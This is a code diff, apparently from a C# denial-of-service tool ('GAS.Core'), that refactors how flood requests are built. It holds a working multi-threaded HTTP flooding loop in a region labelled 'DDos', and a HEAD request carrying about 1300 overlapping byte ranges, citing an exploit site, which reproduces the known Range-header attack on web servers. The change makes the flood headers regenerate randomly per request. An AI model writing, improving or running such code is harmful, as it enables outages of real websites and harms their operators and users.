@@ -52,6 +52,7 @@ namespace GAS.Core
             StringBuilder temp = new StringBuilder(6000);
             for (int k = 0; k < 1300; temp.Append(",5-" + (k++))) ;
             this.AttackHeader = temp.ToString();
+            Console.WriteLine(this.AttackHeader);
             for (int i = 0; i < ThreadCount; i++)
                 (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
             init = true;
@@ -71,33 +72,14 @@ namespace GAS.Core
                 int recvd = 0;
                 byte[] buf;
                 #region Headers
-                if (this._attacktype == 0)
-                    buf = System.Text.Encoding.ASCII.GetBytes(
-                     String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
-                                           "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
-                                           Subsite,
-                                           Functions.RandomString(),
-                                           DNS,
-                                           ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
-                                           "")));
-                else
-                {
-
-                    //http://1337day.com/exploits/16729
-                    buf = System.Text.Encoding.ASCII.GetBytes(
-                        String.Format("HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
-                                Subsite,
-                                (random ? Functions.RandomString() : null),
-                                DNS,
-                                (usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null),
-                                Environment.NewLine,
-                                AttackHeader));
-                }
+                buf = GetHeaderBytes();
                 #endregion
                 #endregion
                 #region DDos
                 while (IsFlooding)
                 {
+                    if (random)
+                        buf = GetHeaderBytes();
                     States[MY_INDEX_FOR_WORK] =  ReqState.Ready;
                     recvBuf = new byte[bfsize];
                     #region Connect
@@ -131,8 +113,32 @@ namespace GAS.Core
                 #endregion
             }
             catch { }
-            finally {}
-            
+            finally {}            
+        }
+        byte[] GetHeaderBytes()
+        {
+            if (this._attacktype == 0)
+                return System.Text.Encoding.ASCII.GetBytes(
+                 String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
+                                       "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
+                                       Subsite,
+                                       Functions.RandomString(),
+                                       DNS,
+                                       ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
+                                       "")));
+            else
+            {
+
+                //http://1337day.com/exploits/16729
+                return System.Text.Encoding.ASCII.GetBytes(
+                    String.Format("HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
+                            Subsite,
+                            (random ? Functions.RandomString() : null),
+                            DNS,
+                            (usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null),
+                            Environment.NewLine,
+                            AttackHeader));
+            }
         }
         public override void Stop()
         {
